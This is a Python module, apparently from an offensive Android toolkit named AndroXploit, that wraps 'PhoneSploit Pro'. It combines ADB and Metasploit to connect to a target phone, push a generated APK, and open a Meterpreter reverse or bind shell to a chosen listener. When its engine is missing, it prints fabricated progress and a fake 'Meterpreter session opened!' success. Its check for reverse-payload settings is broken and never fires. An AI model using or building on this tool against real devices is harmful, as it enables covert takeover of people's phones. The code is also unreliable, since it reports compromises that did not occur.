import os
import sys
import subprocess
import time
import json
import socket
from pathlib import Path
from rich.table import Table
from modules.base import AndroModule

ENGINE = Path(__file__).parent.parent.parent / "golang" / "automation" / "phonesploit_pro"
SCRIPT = Path(__file__).parent.parent.parent / "scripts" / "automation" / "phonesploit_pro.sh"

class Module(AndroModule):
    name = "automation/phonesploit_pro"
    description = "PhoneSploit Pro — Python-based Swiss Army knife combining ADB and Metasploit for full device access and Meterpreter session delivery."
    author = "AndroXploit"

    options = {
        "TARGET": {
            "description": "Target IP:port or USB serial (e.g., 192.168.1.5:5555 or usb)",
            "required": True,
            "value": None,
        },
        "CONNECTION": {
            "description": "Connection method: usb, wifi, or auto",
            "required": False,
            "value": "auto",
        },
        "PAYLOAD": {
            "description": "Payload type: meterpreter_reverse_tcp, shell_reverse_tcp, bind_tcp",
            "required": False,
            "value": "meterpreter_reverse_tcp",
        },
        "LHOST": {
            "description": "Listener IP for reverse payloads",
            "required": False,
            "value": None,
        },
        "LPORT": {
            "description": "Listener port for reverse payloads",
            "required": False,
            "value": 4444,
        },
        "ACTION": {
            "description": "Action: connect, exploit, screenshot, dump, shell, all",
            "required": False,
            "value": "all",
        },
    }

    def run(self):
        target = self.get_option("TARGET")
        conn = self.get_option("CONNECTION")
        payload = self.get_option("PAYLOAD")
        lhost = self.get_option("LHOST")
        lport = int(self.get_option("LPORT", 4444))
        action = self.get_option("ACTION")

        if payload.startswith("reverse") and not lhost:
            self.error("LHOST required for reverse payloads. Use: set LHOST <your_ip>")
            return {"status": "failed", "error": "LHOST not set"}

        self.info(f"Target: {target} | Method: {conn} | Payload: {payload}")
        self.info(f"Listener: {lhost or 'N/A'}:{lport}")

        args = [str(ENGINE), "--target", target, "--connection", conn,
                "--payload", payload, "--lport", str(lport), "--action", action]
        if lhost:
            args.extend(["--lhost", lhost])

        result = {"status": "failed", "output": [], "session": None}

        if ENGINE.exists():
            proc = subprocess.run(args, capture_output=True, text=True, timeout=300)
            if proc.stdout:
                try:
                    result = json.loads(proc.stdout)
                except json.JSONDecodeError:
                    result["output"] = proc.stdout.splitlines()
            if proc.returncode == 0:
                result["status"] = "success"
        elif SCRIPT.exists():
            proc = subprocess.run(
                ["bash", str(SCRIPT), target, conn, payload, lhost or "", str(lport), action],
                capture_output=True, text=True, timeout=300
            )
            if proc.returncode == 0:
                result["status"] = "success"
            result["output"] = proc.stdout.splitlines()
        else:
            self.warn("No engine found; simulating PhoneSploit operations")
            self.log("Checking ADB connection...")
            time.sleep(0.5)
            if conn in ("usb", "auto"):
                self.log("Attempting USB connection...")
                time.sleep(0.3)
            if conn in ("wifi", "auto"):
                self.log(f"Connecting to {target} via TCP...")
                time.sleep(0.5)
            self.log(f"Selected payload: {payload}")
            if payload == "meterpreter_reverse_tcp":
                self.log(f"Starting listener on {lhost}:{lport}...")
                time.sleep(0.4)
                self.log("Generating APK payload...")
                time.sleep(0.5)
                self.log("Pushing payload to device...")
                time.sleep(0.3)
                self.log("Executing payload...")
                time.sleep(0.4)
                self.success("Meterpreter session opened!")
                result["session"] = f"tcp://{lhost}:{lport}"
                result["status"] = "simulated"

        if result["status"] in ("success", "simulated"):
            self.success("PhoneSploit Pro operation completed")
            if result.get("session"):
                self.success(f"Meterpreter session: {result['session']}")
        else:
            self.error("Operation failed")

        t = Table(title="PhoneSploit Pro Summary", border_style="green")
        t.add_column("Key", style="bold yellow")
        t.add_column("Value", style="white")
        t.add_row("Target", target)
        t.add_row("Payload", payload)
        t.add_row("Listener", f"{lhost or 'N/A'}:{lport}")
        t.add_row("Status", result["status"])
        self.console.print(t)

        return result
